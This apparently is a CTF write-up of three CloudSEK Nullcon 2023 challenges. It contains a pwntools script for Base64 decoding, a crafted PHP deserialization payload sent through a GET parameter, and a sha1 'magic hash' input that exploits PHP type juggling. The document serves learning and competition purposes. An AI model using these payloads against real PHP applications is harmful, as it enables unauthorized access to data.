# CloudSEK - Nullcon Cyber Security CTF 2023 

> ClouSEK's CTF challenge during NULLCON 2023

</br>

## Challenges

### Scripting
- [Bases](#bases)

### Web
- [Serialization Saga](#Serialization-Saga)
- [The SHA Juggler](#The-SHA-Juggler)

</br>

------------------------

</br>

## Bases

Points: 100

Description:
- Do you Know Your Bases?
- PS: No Bruteforcing is required
- This Challange does not require you to access any other Port
- ` nc 43.204.152.119 1337 `


When connecting to the server we are given with Base64 encoded text and we have to submit the Base64 decoded text in the input but doing so it keep asking
for new Base64 text

<img width="623" alt="image" src="https://github.com/Aftab700/Private_files/assets/79740895/4a04002b-028c-47af-80a0-2cc3ff6c273d">

Looking at the challenge category (`Scripting`), we can figure out that this process requires automation with the use of any scripting language. I'm am using  Python here

<details><summary markdown="span">Click to see python code :diamond_shape_with_a_dot_inside: </summary>

```Python
from pwn import *

conn = remote('43.204.152.119', 1337)

a = conn.recvline()
print(a)
a = a.decode().split("\t")[1].split("\n")[0]
a = b64d(a)
print(a)

for i in range(2, 102):
    print(i)
    conn.sendline(a)
    a = conn.recvline()
    print(a)
    try:
        a = a.decode().split("\t")[1].split("\n")[0]
        a = b64d(a)
    except IndexError as e:
        print(e)
        pass
    # print(a)
    pass

# n=101 ; flag: CSEK{3he_bas3_dec04er}
conn.close()

```
</details>

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>

```Powershell
PS D:\GitHub\ctf> python .\1.py
[x] Opening connection to 43.204.152.119 on port 1337
[x] Opening connection to 43.204.152.119 on port 1337: Trying 43.204.152.119
[+] Opening connection to 43.204.152.119 on port 1337: Done
b'What does this mean:\tblZNdGp4endmVzRrNTZoRHBsZUpLSXlMWDFQVWlDYloyY1RGZDhFMDM5T3ZzUkFtSGFCUUdnWVNvN3JOcXU=\n'
b'nVMtjxzwfW4k56hDpleJKIyLX1PUiCbZ2cTFd8E039OvsRAmHaBQGgYSo7rNqu'
2
b'> What does this mean:\tSGV6RjhocWF0MGlMUlBEQTFsTXJWS1VFNEpqVE9HTnhwMlhkNllCM3Y5U29zV0l3NXltYjdjbmtDUVpndWY=\n'
3
b'> What does this mean:\telc3S1JnODNTRXlNWXFQcDBqNEF0czZ1VXhmSWxhQkxta1puT0RUTlF2aDVlVmkxZGNIR2JYbzlGQ3JKMnc=\n'
4
b'> What does this mean:\tNHpiSk84Zm4yR2gzNWFLTHNXU1ZSQXkwWnZIN3FEZ2l1ZU45dGRyVUJtSXBUMUN4UTZNandFa1BYRmNvWWw=\n'
5
b'> What does this mean:\tVkZHQ3BydjBtWkExaHNkS0JQeTV1NGxqUlNuT01EaWdXYXc5dFQzZXFKTjhZUUliMlU2azdFY1h6SHhmTG8=\n'
6
b'> What does this mean:\tVmZ5UXZ3UnRHbjUwbWVwN1U0ck5kNkgzQmxjRVRBTzFrdXNLRkRqWWI5UG9XSlhocXpaZ0lDaUw4U3hNYTI=\n'
7
b'> What does this mean:\tdkdRbUVlckRTd1dUMml4SlJDNGdYYTMwTmgxOWNIejY4dFpWeXNvRnVPVWJCNTdwcWRuTWpQTGZLSWtsWUE=\n'
8
b'> What does this mean:\taE5KVXFrUnRXVnoxb2N5Z0ZmMFo4NW1CZGoySVFuVEFLN01PaTZIWUQ0M0xzYVNYcEV3UGVDcjlseHVHYnY=\n'
9
b'> What does this mean:\tSmFkWG1JMk9wVEg3am5yQ0dpOEt6OVo1eXE0eEUxZjNRZ0Z0NmV1QVVvQmJMd05QRGNsaE1Za1ZXUlMwc3Y=\n'
10
b'> What does this mean:\tZTN1cGd6UW1mSE5MQmRJODdLVnRGWk9jRUFZR1drYWJ2b0RpVDlSUzBscTVVd3NocjZNeDJQWGpuSkM0MXk=\n'
11
b'> What does this mean:\tVkN2UEJJSHJlMGlaRXhkTDNXZmJSMUtuTzhBZ29qVW1KVDdwWE15YWhxNHNTMndGOWx1UVljenQ1RGtORzY=\n'
12
b'> What does this mean:\tRWw2eEpoaUtudUFXTTNJRlZMWDBtWW9ITnExa2V2ZGNRYlB5MmdVclpwYURUT0M4U1I1ZnM3dEJqOUc0enc=\n'
13
b'> What does this mean:\tVmJ4cHJzRWNZZUZqbTVoWjYxSEt2U1JpZ0p6azlPZENHQldVQTBhTG9mUTdJVFBxeU50d2xEM1g0Mm51TTg=\n'
14
b'> What does this mean:\taDdmMXhYa05aYjlHZ0U2SndtaXBRME92V2NqQWEzNWxJcmVxQlBSVkNZVXlUOEQyU3VuRk16ZDRvc0tIdEw=\n'
15
b'> What does this mean:\tVW9pRUN0Tzc2alNETjJaTVc0Rnh6clFrcVgxSElnZWJScDBQQm05eUd2Y3dhdXNLVDUzTEFoWWRWbG5KOGY=\n'
16
b'> What does this mean:\tVHYzVzhRWmFBandIS3ljaGcxck9FYlBlNEp0TTk1ZFJ1a0JvMlNtWExZVXpscXhuZjBGN0dpNkRDTnBzSVY=\n'
17
b'> What does this mean:\td0ZaUXZuZm1BY05SREdUalNpVXJzMXl4dGhLNFhiSnVrWUU4UE1JSHBnQk96N1dsVjJhM0M2ZExvOTBxZTU=\n'
18
b'> What does this mean:\tNzZmakxLeU5NYmNZQ3dUV2QxSnpIbHN0b1FVOWV4NDBtYVJGcjVCSXFaVkFrR1hoTzN2bmkyRURwUGdTOHU=\n'
19
b'> What does this mean:\tTkRqN29CUFR0OVVPUXZoMkxBNHl4U0V3QzZhM1pzZUhxaW1HRmtuZklLWWdWYjFKOHBsdVIwclhjNU16ZFc=\n'
20
b'> What does this mean:\tQjhIMllTalJyTjRWSmU5V25rYmNwcUZaRVB4aG9YS0Q3RzBheUFJc3Y2Q1F3VDUxbXVpVWxPdGczTGZ6ZE0=\n'
21
b'> What does this mean:\tQ2lLY3FTTkxvRm1XVVRSM0R1UFk4ZnpudjcwUUpieWFqNXQyVk9oR0lwRWRneDFYNEFlczZCa0haTWw5d3I=\n'
22
b'> What does this mean:\tSGxQcHhlOFNhZzN3N01GaU9zQ0oya1hZTmgxb1VJVDU0Yks2eVIwV3JHQlZRTDlxdkVqdW1BZER6WmNudGY=\n'
23
b'> What does this mean:\tR3psdWY1ZWtJcThUTXh0b1lFN1ZuTGhVSzIzQVdwQ3liY1BzUURtOUhnWnJYaXdKNE5SRk9CMVNkdmFqNjA=\n'
24
b'> What does this mean:\tRFNkTXR3eDhZZ3lHT0ExNG5YaG9GUWxXOTdiSEpjNkxhQzJ1WmVta3BzSzUzVlROclB2QmpVMHpSaWZxRUk=\n'
25
b'> What does this mean:\tM09OMjBaWURWbEx3SUtkSmJmaHU1Ukh0cEVBazZ4TW9URzRYUzFjVXpyQ1BqOG5naXZReXFGOVdCN3NhbWU=\n'
26
b'> What does this mean:\tUEZzek9veU1wNnRaZ0hMSkdiMDI3YWNXQWt1UmxkMWV2VU5JaVF4VlRZOW1Dd0RFSzNmcXI4U2g1Qm5YajQ=\n'
27
b'> What does this mean:\tRTdoVzhUSXBOb3REUGFuNHZzSDk1ZVJ6MlNPNmNNTGozcXdVaVpRQmRHS21GdXhDZnJYa3kwZzFsQVZiSlk=\n'
28
b'> What does this mean:\tYXZiTFRtV013OWxRWmVxSkg4QTRFQmtnQ2p5bnpPZllzdG83Y0d4S3VkRlJJaFY1cFNQRHJVMjE2M05YaTA=\n'
29
b'> What does this mean:\tV1oyNFl3M2lEWHRVMUVQcW1mdmJsUU5qQjB4OFI2a1ZMVENySmhTRktBR3pkOU1uZW9jdU9Ic2dJeTc1cGE=\n'
30
b'> What does this mean:\tYkFWZnY1VEIxWkpqN08zaHNOVVBJOG9uUWFGbFI2ckxrV3F5bXAyeDA0Z0RTaVlLQ3pHRXdjSDlYZE1ldXQ=\n'
31
b'> What does this mean:\tdGNkMUhTSURLVWFPZzhXWnhHRmtobG5CdVFOVkFYam95czJmWTUwYjRNRVJpdnpyTGVKVHc5cTNQN3BDNm0=\n'
32
b'> What does this mean:\tcDloNmdsYkZubVZFUTdPQ0JENHZHS2pIV3g4STFhZU5SekxYQTBmVHlzdTV3a0p0UzNjcm9xZFBVWVoyTWk=\n'
33
b'> What does this mean:\tcnFqN3pMdTlRMWNUQUU1Tml3OHlnU3NoRmQ0SkllWjBiM2E2S21PWFZvdld0TWZsR0RZVW54SENwUmtQQjI=\n'
34
b'> What does this mean:\tdnVoaVh4cTFLWWxBUWpOT1M2a0hwYTVDM29QMHJCc1VJOEV0OUQ0YmNWUkZMZm55Sk16d1ptZGVUN1dnMkc=\n'
35
b'> What does this mean:\tS3c0TkFEMDVsN3lWVWlmbk1jYVRHMWVrU1c2dFJvSTlKRWJPTEZoQjh4WlF6UHVxM21qdlhzcFlDSHJnMmQ=\n'
36
b'> What does this mean:\tN3JkdVN0NmxqZkZucUxVM2I0MFZDcHZOWmN6NU9LSXM5SldNZ1gyaERpUkhha1BBVDFCeUVHd29ZbThRZXg=\n'
37
b'> What does this mean:\tQjR3RUZJRDlybE9xYmc4R1h2SHRWNjNZaFNkZW95WnVVSmN6a2lLbm1MUEFNUVIyVHA1MUNmTnMwN2phV3g=\n'
38
b'> What does this mean:\ta1NwUEd2YmhtamNFSXlKMGlud05YVVZETWxBcllnTEZUN3RRMk80NWZDbzN4Ukh1ZTE5enNLWmE2VzhxZEI=\n'
39
b'> What does this mean:\tek1aZ2NyYUtvQ0lEYll4NzR0UVZoSGp2MHAzc3FQeWw4a0ZTOWZlbjE1TlRXT0xVWEVCd2kybXVkSlJBRzY=\n'
40
b'> What does this mean:\tc1RSVWlqTU9Ka1M0UFlabUlOcTVocjMxRDJ1eVZ3V2ZRR0VGeHRwSEFLOWxYZXZDZGMwYWJ6ODZnQm5Mbzc=\n'
41
b'> What does this mean:\tNzlDMWU0bWw1dnJFU2dBWlg2UXN0Zld6Rk5wRE0wZG93cTNMS2NZdWthSGJVTzhCUlZ4Sm55aFBJVEdqMmk=\n'
42
b'> What does this mean:\tWDZoQmFHN2o4Vk51Y1dpUmVsU2Z6QTV3OUNyM0tIVG5iT0l4UUR5czBrb2QxUExwbU1ndHZxVUY0WllKMkU=\n'
43
b'> What does this mean:\tRHlOMkhoQUJLT0xxV2djMTVDanN0cGlWWWRyUlNmOEdabDd1SkVROXZQbU1GeG80bjNUYlhla0lhejYwVXc=\n'
44
b'> What does this mean:\tNUYxMmJmWHFHdG4wdVJBYWxjVDM4aU9KTUxaeHBDTnlRV2drSTlIcjZoRG1QVmpLZDdzWUJTdjRVZW9Fenc=\n'
45
b'> What does this mean:\tbk5Cb1NnUnNYY0ZFeE1Rdjc1T2tiZVVaemZUMkdyeXB3Q0hoYWQ4TEpXMWlQRDRJQUszVnVZMDZsam05cXQ=\n'
46
b'> What does this mean:\tV3h6UElTMDhteVI5aUZZRUtvUUxjSlZYRHdHZ05xNWtNdkI2ZHNBZm5sYXRwQ1p1ZVVyMTIzSDdoYmpPVDQ=\n'
47
b'> What does this mean:\tSWQyMUtSaFVQdlkzdUY5NGVRbENrQnhYYnBtY0hpV3JWc25PYVN0Z3lmQTg3VEpOTERFNXpHcVp3MGpvTTY=\n'
48
b'> What does this mean:\tb0RqdUJnYjJNcDZZQTdjMGtRWExhVGY5bkdpMW1zM1dPSWhFd2R5bENTenhSdEZIS3Y1clVOOGVaSnFQNFY=\n'
49
b'> What does this mean:\tRXcyaXhWNUczN2FDUTRSNkpTcHlxMURrSFRkQmUwRnR2TmxNb2pnVWZtQThMemhaUFdYcklLc09ZdW5iOWM=\n'
50
b'> What does this mean:\tT2RYaFZ2ek1FV3dDSGYybG8zNE5xMGNpZW03Rkl1QkpHOGJaYXA1eTkxU3NuallLREw2VEFRVWtQeFJ0Z3I=\n'
51
b'> What does this mean:\tTHNweGZ1emE0SVFFblRxaTU2dGJGZ1JoTW9BQzNsUGVqR0hLN3JKd1ZYODlOT3ZaMlV5MURja21CMGRXU1k=\n'
52
b'> What does this mean:\teWM5bGl6M0FrcW5XcFFOVjJYdjZZN1pteHNMd2gwdTFNUlVGNW9mdEI4RGdKYmFPSFRqQ3JFS0lQZWQ0R1M=\n'
53
b'> What does this mean:\tR296NTlTRENoYmRzWXBMbXhUWml2OGUyUHFjUWtWbEVuVWc0RnJCN1gzZkFXeTBITjZhdU90d0lqS00xSlI=\n'
54
b'> What does this mean:\tZlpoUEJYVVFTOFlscTN6VnljUnZwRE5ka0F3N245MjZpeEdJT3RUbTEwNUtiakVzZ0pGYUh1b2U0TUNXckw=\n'
55
b'> What does this mean:\tUEFKUUY2OGVWYnA0TmtqMFpXWTNjZHd1N1RubFh5MXRhbXFnU0lCeExVMk9LaEVSc0c5cjVpQ0Rmdm9ITXo=\n'
56
b'> What does this mean:\tNnhpU1BmcXQ0MHJ3empXN00zSkxIZ2hac3ZDUlhlbEZJTjFEVUdWZFFvblliT3lBRTJUYUttOGNrNXB1Qjk=\n'
57
b'> What does this mean:\tUDFYYnpNRGdFQkNXMGV2WTZuU3E3eDJOUWxkNW05YUFUTDRaVXlHZkhrRm93T2ozY0ppckt1cGh0VnM4Ukk=\n'
58
b'> What does this mean:\tRnRhSzBMdlJicm1Ya3pDWUluUzZBUUJVNW9zdUh4V0VPOGhNZXlkTkRKcWNmaVYyUHc0ZzczcFRHajFsOVo=\n'
59
b'> What does this mean:\tY0hpYm1SOEVBelp1WWszTzE5NWx2MlVmVlNwNEtRdGdUTFhuTlBEV0Z3SmVzckcwQzZCYXhkcXlqSU1obzc=\n'
60
b'> What does this mean:\tZnFVYlk3TkpPeTMwZVdER0xGUWtDVm1zd2FabEU2Qk1pS2hYdXZUOW81bkhJODQxdHJBU2Myamd6eHBQZFI=\n'
61
b'> What does this mean:\tajk0NnowN0VsR2tLc3gxVzJpblpOTFlRZUozcXRkbUFYNXJmYW84SE1JUndPdXZWeVVjcGdoQ2JUUEJTREY=\n'
62
b'> What does this mean:\tVWtMdmExaGQ5QlNxeVRQWkVHbGM1RGdzekEzTVFwaUowS0hZQ21Jb1JydzhGWFZldWZqbjJPNzR0TjZXYng=\n'
63
b'> What does this mean:\tUzVnVURHbVZuWlQwejNpUElsT0trOWR2Y2pIZVl1WEpzQjJ4V0ZoQTFwYXd0cU5mTW9yNHk2QzdSOExFYlE=\n'
64
b'> What does this mean:\tZEFzYXk3TFdvOVlycFMxVXV4ZU5qR25jRno2QzBINU9nVHdrSVZpSmhCYktmcTgybTN0RGw0UE1RWlhFdlI=\n'
65
b'> What does this mean:\tSXJRMFA1dDdkQ0RMbUt6T2lOMmNuUldzQnZsNHF1VjY5aHdZVGVTYmdqVWtGb0hFZjhNMTNhcFpKWHhBR3k=\n'
66
b'> What does this mean:\tejlaa3FlNXZKNEdmMFdBSXNWaG83YUZZYktUMU1jUXlOd3JQU2xSZ3BFQjJMNmp0T0hkQzhVdVhteG5EaTM=\n'
67
b'> What does this mean:\teVhQUjNrS3NwZ2RMb2xaVVNUTXF3QjRRZTdEOVd2NjJiTjBHWXhDaGpmRmFySm1BOEl1Vk9FaUh0emNuMTU=\n'
68
b'> What does this mean:\tYXdYOUlKR1prdVlXUGpVcXA2NTJIRWlURm9NMXowTzhLU0FiTmc3bGQ0TFZDY1JoeWVmRHZuUXJtM0J0eHM=\n'
69
b'> What does this mean:\tZEZQN21PVW9ZQnYwOHBRTGg5d0tiZ015Mm5XY0laM0RpbENyVkE1MUg2RUc0U0p1VE5mcWFSZXNYanp0a3g=\n'
70
b'> What does this mean:\taFlHRDByY21QM2ZsekNXMVVvSDYyYUlUZGpxOEtSTmVGNHNYTWJ0Z2s1dlNPUUV1Sm5CaVY5cFp5N0x3QXg=\n'
71
b'> What does this mean:\tbmI1aWg0am9rckdEM1kwOUtwcUpGUGZzN1hjV3ptQXVUQ0I2Z05sOFJFTUxhWkhVSU90UWUyU3d5eHZWZDE=\n'
72
b'> What does this mean:\tV3hscWtKejh5VTRzdkh3cDdqY1h0dWQ2ZURTVEtpVkJBMVI5UWhHWlluNTJhTE1nRWJOM28wbU9ySUNGUGY=\n'
73
b'> What does this mean:\tRnhJTHp0cDVLeU1PZVRQWEIyZHdvYzhIU0R2TjNHNHJuZ2k3UVlDVWtBRVIxVkp1WnM2bGhtYmZqOVdxMGE=\n'
74
b'> What does this mean:\tUlpocTl4bkxCUXJ1WHAwc1R3ZjFDem1qRGJNT3ZkMzg2eVNhVkpLNTRBaVVJMkZ0WW9lY2tsTjdFUFdIZ0c=\n'
75
b'> What does this mean:\tSlN5a0h3enhRVW1iTWo4YUFyREN0czJpbGYwRVZvRm5ZWFd1OXFCWmdOZGU3S1JoUFRjNjF2TzVJRzRMM3A=\n'
76
b'> What does this mean:\tOVNSMW5jV2xtbzI1NGR5dVUwUUhpT0R2c2FxaFY2elA3Q3JBWWZNQkZHRXhnazhlS2J3cFhMSXQzSk5aVGo=\n'
77
b'> What does this mean:\tdnJTUFRlbmpHZmRFVTBXSzJGd0kza1liNHN4WmhDQW9NWExWbWxpNUI3SlE4Z3F0dTlPeWMxTkR6NnBhSFI=\n'
78
b'> What does this mean:\tcWwydEJ4OVlETmc2M2hHbmlPSmZ3a1RwUG1WTUVkSXl2MTgwTHI1ekhhVWVYNGJRN0Z1Q1pLaldTQWNSb3M=\n'
79
b'> What does this mean:\tc1hvWkJKNzk0cFEzZG1URXdNajBueERPUHJnTld6cUxpVXZidHlSRkhBbGs1dVkxSzZJaFZhQzhTZmNlMkc=\n'
80
b'> What does this mean:\tbWQwakZmMmlRWUpiZVpSaHBOa09jdTRWUE1FQXRMc1R6SEk2S3hXQmd2d0c1bFVuQzhTeVhvcWExM3I3OUQ=\n'
81
b'> What does this mean:\tSFVXbVRvWUR3MTBTYU5meHNBZ1Fqa0VWdkxoT3RGeUN6MjM4ZDRsQks3Y1JNcXA5clhHUDZaNUludWlKZWI=\n'
82
b'> What does this mean:\tNGgwRXc1cW1XS0NEMk55OWJrUGNCYUdGcDNUSHhSSmpYTDhzZzE3T3VuQVlvU3ZJVXJsZTZWaU1kdFFmelo=\n'
83
b'> What does this mean:\tVTZHaVgwVFJueFZZZEQzenZCNGhmRkNKTGpLdW9FZ2tIWnRNTnJjMnlxc0FsUThXcEk1ZXcxOWJPUFNhN20=\n'
84
b'> What does this mean:\tNmVwbUJrTWFMSlRpWHN6TjcyUG9LM3JsU3hmRjA0WTh1d0NFYmdocWNabmREMUhHVVZ2Ulc1QVFqOXlPSXQ=\n'
85
b'> What does this mean:\tekpBaVY3RnlNbzRSV3ZHT2pxWVhwY2U5Q3MyYnVsUGs2OG5yWndkUzB4M0hmSU4xbVFCREVndDVVYUtoTFQ=\n'
86
b'> What does this mean:\tbHNHOU1KUVdidTJ2TGo3ZmtPMUhOWWV5RlRtM2NadDB6YXBCOFVpRGRBNm5xRTVJWGdWd1NLUlBveENoNHI=\n'
87
b'> What does this mean:\tVUc3UWVEZnFOU1l2bzJzQTNpVE1tUGN4VjUwQ1prcmRYVzRIYmhnbGFSOEJ1MUtFaklGcG5Kenc2T0x0OXk=\n'
88
b'> What does this mean:\tenhQSFVqU2Ezc084b2VRS3V0djFnYjVCN0FHMnJXNGZpZEZEMHlxWmxJWGtKUnBDRTlWTUw2d2NUbk5tWWg=\n'
89
b'> What does this mean:\taHBHY2RNMmdXVjRLaUNVSnV0blBRcmFPZnltTnNIUmowSThEVExiQTdCOWxFWTV4cTZYZW9TM1p2Rncxems=\n'
90
b'> What does this mean:\tcEZXbUUxM2FEWG9NOWxVczhpNGg2QmVUeHFmZ2tMellKSUhiQ1ZuT1Nyd1JqZHVHS3YyWjA1Y1B0eUFRTjc=\n'
91
b'> What does this mean:\tcEo0OWxWcXN3ODI2anREQ2MzN094S3J6RW5QMXZORklTVFpVWTVtZUdMeTBkUWJNSGZYaG9hQXVnUkJpa1c=\n'
92
b'> What does this mean:\tZU83UzVOOWp6aXNUb2hsSks0clpuNmJ3eFh1cVdtRVEyR2R0cFlhTUJDSWtBOEhEZ2N5VmYzUlAwMUx2VUY=\n'
93
b'> What does this mean:\tVmNSMDhiNkkyZ1M1czdyaHZqNFlUZnlOSm5BSzNYRnFXZFo5d2FCVUd1UTFMaXpleENPa29sREhQdG1NcEU=\n'
94
b'> What does this mean:\tb09TUDIxTUhXc1hUeHFydmpWN21FOENpNXQ2WjNmdXcwS2VuVURSYWtGSkxibFFCZGNwTnlnQWhHNFl6STk=\n'
95
b'> What does this mean:\taG1IMlR0Q2IwOGRaSVNxOVZQSnVyN0JPallveTZNRkVmcEtMUkdEWFdVa2F4c1F3QW52ZzM1Y2llemw0TjE=\n'
96
b'> What does this mean:\tc0RGYVZBRWR3eWpaNlBmYlVCN1hwTWtRTE80MXQyM1dvZVJ1bU5UbDU5SUtIaXJ6MGdZRzhKdmh4bmNDcVM=\n'
97
b'> What does this mean:\tVkpIM1FabWZSdjVOOEVJc1l5MVdpRmF3ZGxiS0dEWDcweEx6a01ocUJQQ29PZVVTVHRuNHIyY2c5QXBqdTY=\n'
98
b'> What does this mean:\teUs5YU04cUp3U0NmaHBFVmlYM2wydVVrZEcwUmJuakx6bUFnUUI0WnM2dHZXTzVJUGN4WTFURkhOZTdEb3I=\n'
99
b'> What does this mean:\tSHltaGdNVWNJUTdvM3J3RFB1WmVuZlRLWXhxYjZOWHZHanpTOEZ0aU8yOUVBa1JkSldWc2wwTDRwQkMxNWE=\n'
100
b'> What does this mean:\tSnpzNkVCUTdZRloyd3JlNHUzVU1Sa2xtTHBPZzVkV1hEOXFiaHgwdmpTVlAxeUdUTkNuS2NmQTh0YWlISW8=\n'
101
b'> CSEK{3he_bas3_dec04er}\n'
list index out of range
[*] Closed connection to 43.204.152.119 port 1337
```
</details>

Flag: `CSEK{3he_bas3_dec04er}`

</br>

## Serialization Saga

Points: 100

Description:
- This Capture The Flag (CTF) challenge is designed to assess your ability to identify and exploit fundamental insecure deserialization vulnerabilities. Can you successfully execute the necessary functions and retrieve the flags? Lesssgoo!
- PS: No Bruteforcing is required
- https://webctf.cloudsek.com/serialization-saga

On the webpage we can see the php code

<img width="478" alt="image" src="https://github.com/Aftab700/Private_files/assets/79740895/727199bb-3dae-402b-9f4a-cf799560d186">

<details><summary markdown="span">Click to see PHP code :diamond_shape_with_a_dot_inside: </summary>

```Php
<?php

error_reporting(0);

class CloudSEK  {

    private $func_no;
    private $func_name;

    function __construct($no , $name)  {
        if ($no == NULL && $name == NULL)   {
            $this->func_no = $no;
            $this->func_name = $name;
        }
    }

    function __wakeup()  {
        $func_map = array(
            1 => "XVigil",
            2 => "BeVigil",
            3 => "GetMeDemFlagz",
        );
        
        $func_no = $this->func_no;
        $func_name = str_rot13($this->func_name);

        if ($func_map[$func_no] === $func_name)  {
            $this->$func_name();
        }
        else    {
            echo "<h3>Invalid Object Data</h3>";
        }
    }

    function XVigil()   {
        echo "<h3>XVigil is a cybersecurity platform designed to help organizations monitor and mitigate potential security threats and vulnerabilities across the digital landscape.</h3>";
    }

    function BeVigil()  {
        echo "<h3>World's first Security Search Engine mobiles that makes sure the applications installed in your phone are safe.</h3>";
    }

    function GetMeDemFlagz()    {
        $flag_file = "/tmp/flag.txt";
        if (file_exists($flag_file))    {
            $file_contents = file_get_contents($flag_file);
            echo $file_contents;
        }
        else    {
            $err_msg = "<h3>File Not Found!</h3>";
            $file_contents = $err_msg;
            echo $err_msg;
        }
    }
}

// $cloudsek = new CloudSEK(1 , "XVigil");
$sess = $_GET["sess"];
if (!isset($sess))  {
    exit();
}
$data = base64_decode($sess);
$obj = unserialize($data);

?>

```
</details>

<img width="241" alt="image" src="https://github.com/Aftab700/Private_files/assets/79740895/6cab5aac-8f77-4a18-9927-e1183d81a651">

In this code we can see that it is checking if GET parameter `sess` exist if yes Base64 decode it and parse it to php unserialize() 

There is also  `__wakeup()` function which is called on unserialize

to get the flag we have to call `GetMeDemFlagz` function. __wakeup function will perform rot13 on `func_name` and value of `func_no` should be index of the name of function in `func_map` array.

<img width="147" alt="image" src="https://github.com/Aftab700/Private_files/assets/79740895/0567baa2-1731-4324-a816-05e84f701de8">

Now lets create the payload

Object name would be `CloudSEK` <-- name of the class. 
func_no = 3 and func_name = rot13("GetMeDemFlagz")

```
O:8:"CloudSEK":2:{s:7:"func_no";i:3;s:9:"func_name";s:13:"TrgZrQrzSyntm";}
```

Base64 decode this and put it in GET parameter `sess`

```
https://webctf.cloudsek.com/serialization-saga?sess=Tzo4OiJDbG91ZFNFSyI6Mjp7czo3OiJmdW5jX25vIjtpOjM7czo5OiJmdW5jX25hbWUiO3M6MTM6IlRyZ1pyUXJ6U3ludG0iO30=
```

<img width="331" alt="image" src="https://github.com/Aftab700/Private_files/assets/79740895/a913e5f5-b94f-44cd-8c15-a0c4eaea3f54">

Flag: `CSEK{PhP_0Bj3CT_D3$3R1L1Z@T10N}`

</br>

## The SHA Juggler

Point: 100

Description:
- Dive into the depths of "The SHA Juggler," a mysterious web challenge that tests your prowess in PHP type juggling, cunning encoding techniques, and web exploitation. Your mission is to outwit the system, leveraging the peculiarities of PHP type comparisons, decipher the applied encodings, and exploit vulnerabilities to retrieve the concealed flag. Can you navigate the enigmatic interplay of types and encodings and emerge victorious?
- PS: No Bruteforcing is required
- https://webctf.cloudsek.com/the-sha-juggler

in the pagesource of the webpage there is a variable `isThisNormal` which have long hex code, let's decode it

```
const isThisNormal = "50 44 39 77 61 48 41 4b 4c 79 38 67 65 57 39 31 58 32 5a 76 64 57 35 6b 58 32 31 6c 4c 6e 42 6f 63 41 70 70 5a 69 41 6f 61 58 4e 7a 5a 58 51 6f 4a 46 39 48 52 56 52 62 4a 32 68 68 63 32 67 6e 58 53 6b 70 49 48 73 4b 49 43 41 67 49 47 6c 6d 49 43 67 6b 58 30 64 46 56 46 73 6e 61 47 46 7a 61 43 64 64 49 44 30 39 50 53 41 69 4d 54 41 35 4d 7a 49 30 4d 7a 55 78 4d 54 49 69 4b 53 42 37 43 69 41 67 49 43 41 67 49 43 41 67 5a 47 6c 6c 4b 43 64 45 62 79 42 35 62 33 55 67 64 47 68 70 62 6d 73 67 61 58 52 7a 49 48 52 6f 59 58 51 67 5a 57 46 7a 65 54 38 2f 4a 79 6b 37 43 69 41 67 49 43 42 39 43 69 41 67 49 43 41 6b 61 47 46 7a 61 43 41 39 49 48 4e 6f 59 54 45 6f 4a 46 39 48 52 56 52 62 4a 32 68 68 63 32 67 6e 58 53 6b 37 43 69 41 67 49 43 41 6b 64 47 46 79 5a 32 56 30 49 44 30 67 63 32 68 68 4d 53 67 78 4d 44 6b 7a 4d 6a 51 7a 4e 54 45 78 4d 69 6b 37 43 69 41 67 49 43 42 70 5a 69 67 6b 61 47 46 7a 61 43 41 39 50 53 41 6b 64 47 46 79 5a 32 56 30 4b 53 42 37 43 69 41 67 49 43 41 67 49 43 41 67 61 57 35 6a 62 48 56 6b 5a 53 67 6e 5a 6d 78 68 5a 79 35 77 61 48 41 6e 4b 54 73 4b 49 43 41 67 49 43 41 67 49 43 42 77 63 6d 6c 75 64 43 41 6b 5a 6d 78 68 5a 7a 73 4b 49 43 41 67 49 48 30 67 5a 57 78 7a 5a 53 42 37 43 69 41 67 49 43 41 67 49 43 41 67 63 48 4a 70 62 6e 51 67 49 6b 4e 54 52 55 74 37 62 6a 42 66 4e 47 78 68 5a 31 38 30 58 33 56 39 49 6a 73 4b 49 43 41 67 49 48 30 4b 66 53 41 4b 50 7a 34 3d";
```

It is double encoding: hex > Base64

Tool used to decode: https://gchq.github.io/CyberChef/#

after decoding it with hex and Base64 we get php code

<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>

```Php
<?php
// you_found_me.php
if (isset($_GET['hash'])) {
    if ($_GET['hash'] === "10932435112") {
        die('Do you think its that easy??');
    }
    $hash = sha1($_GET['hash']);
    $target = sha1(10932435112);
    if($hash == $target) {
        include('flag.php');
        print $flag;
    } else {
        print "CSEK{n0_4lag_4_u}";
    }
} 
?>

```
</details>

This is php code for file `you_found_me.php` and it will check for GET parameter `hash` and to get the flag it will check for the condition if `sha1(10932435112) == sha1($_GET['hash'])`

But before this it will check if `$_GET['hash'] === "10932435112"` if yes die.

We can see that for the flag condition it is using `==` in `$hash == $target`. this is loosely comparision

The `sha1 of 10932435112 = 0e07766915004133176347055865026311692244` and in php this is treated as scientific E-notation.

Scientific E-notation is used to write very long numbers in a short form, `1e6` is `10^6` which is `1000000`

Now because this sha1 hash of "10932435112" start with `0e0` it will be trated as "0" because 0^anythig is 0. so any string which have sha1 hash starting with 0e and followed by any number will be treated as "0" and it will pass the condition.

Reference for this type of hashes: https://github.com/spaze/hashes/blob/master/sha1.md

This hashes are also known as magic hashes

here I'm using the payload: `hash=aaroZmOk`

```
https://webctf.cloudsek.com/the-sha-juggler/you_found_me.php?hash=aaroZmOk
```

Flag: `CSEK{typ3_juggl1ng_1n_php}`


</br>

:octocat: Happy Hacking :octocat:
